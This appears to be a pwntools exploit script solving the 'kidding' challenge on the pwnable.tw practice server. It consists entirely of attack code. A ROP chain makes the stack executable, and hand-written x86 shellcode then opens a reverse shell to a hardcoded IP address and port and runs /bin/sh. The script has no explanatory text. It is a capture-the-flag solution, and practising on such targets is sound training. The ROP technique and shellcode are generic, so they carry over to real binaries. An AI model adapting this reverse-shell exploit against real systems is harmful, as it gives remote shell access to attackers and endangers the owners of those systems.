from pwn import *

#p = process('./kidding')
p = remote('chall.pwnable.tw',10303)
bin = ELF('./kidding')

#gdb.attach(p,'''break *main
#break *0x80bd13b
#''')

__libc_stack_end_pointer = 0x8048902
pop_ecx = 0x80583c9
inc_dword_ecx = 0x80a18b7
jmp_esp = 0x80bd13b
__dl_make_stack = 0x80ea9f4
__stack_off_nx = 0x80937f0

payload = 'A'*8 + p32(__libc_stack_end_pointer-0x18)
payload += p32(pop_ecx) + p32(__dl_make_stack)
payload += p32(inc_dword_ecx) + p32(__stack_off_nx)
payload += p32(jmp_esp)

#socketcall(0x66)(0x01,socket(AF_INET,SOCK_STREAM,0))
shellcode_reverse  = asm('push 0x01')
shellcode_reverse += asm('pop ebx')
shellcode_reverse += asm('cdq')
shellcode_reverse += asm('mov al, 0x66')
shellcode_reverse += asm('push edx')  #0
shellcode_reverse += asm('push ebx') #SOCK_STREAM
shellcode_reverse += asm('push 0x02') #AF_INET
shellcode_reverse += asm('mov ecx, esp')
shellcode_reverse += asm('int 0x80')

#save return file
shellcode_reverse += asm('mov esi, eax')

#socketcall(0x66)(0x03,connect(esi,sockaddr(AF_INET,port,addr),addrlen=0x10))
shellcode_reverse += asm('mov al, 0x66')
shellcode_reverse += asm('mov bl, 0x03')
shellcode_reverse += asm('push 0x69fb459e')
shellcode_reverse += asm('push 0x79a80002')
shellcode_reverse += asm('mov ecx, esp')
shellcode_reverse += asm('push 0x10')
shellcode_reverse += asm('push ecx')
shellcode_reverse += asm('push esi')
shellcode_reverse += asm('mov ecx, esp')
shellcode_reverse += asm('int 0x80')

#dup2(0,1)
shellcode_reverse += asm('pop ecx')
shellcode_reverse += asm('inc cl')
shellcode_reverse += asm('mov al, 0x3f')
shellcode_reverse += asm('xor ebx, ebx')
shellcode_reverse += asm('int 0x80')

#execve('/bin//sh')
shellcode_reverse += asm('mov al, 0x0b')
shellcode_reverse += asm('xor ecx, ecx')
shellcode_reverse += asm('push 0x68732f')
shellcode_reverse += asm('push 0x6e69622f')
shellcode_reverse += asm('mov ebx, esp')
shellcode_reverse += asm('int 0x80')

#pause()
p.send(payload+shellcode_reverse)
p.interactive()
